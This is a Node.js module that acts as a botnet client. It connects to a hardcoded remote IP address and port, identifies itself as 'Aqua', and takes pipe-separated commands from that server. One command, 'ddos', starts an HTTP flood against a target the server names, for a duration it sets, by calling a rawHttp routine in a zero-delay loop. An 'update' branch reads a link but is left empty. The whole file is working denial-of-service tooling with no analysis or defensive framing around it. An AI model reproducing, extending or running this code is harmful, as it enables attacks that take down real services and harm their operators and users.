module.exports.run = (function (){
    const rawHttp = require('./Scripts/rawHttp')
    var net = require('net');
    var client = new net.Socket();
    const mainServer = require('./index')
    const ServerName = "Aqua";
    const request = require('request')

    try {
        client.setKeepAlive(true, 500);
        client.connect(4372, '82.131.114.232', function() {
            console.log('Connected to the Server');
            client.write(ServerName);
        });

        
        client.on('data', function(data) {
            data = data.toString();
            if(data.split('|')[0] === undefined) return;
            data = data.split('|');
            let option = data[0];
            if(option === "update")
            {
                let UpdateLink = data[1];
                
            }
            if(option === "ddos")
            {
                let URL_IP = data[1];
                let Time = data[2];
                let Type = data[3];
                if(Type === "rawHttp")
                {
                    let running = true;
                    setTimeout(() => {
                        running = false;
                    }, Time);
                    var interval = setInterval(() => {
                        if(!running) clearInterval(interval)
                        rawHttp.start(URL_IP)
                    }, 0);
                }
            }
        });

        client.on('error', function(data) {
            mainServer.run();
        });
    }
    catch{

    }



})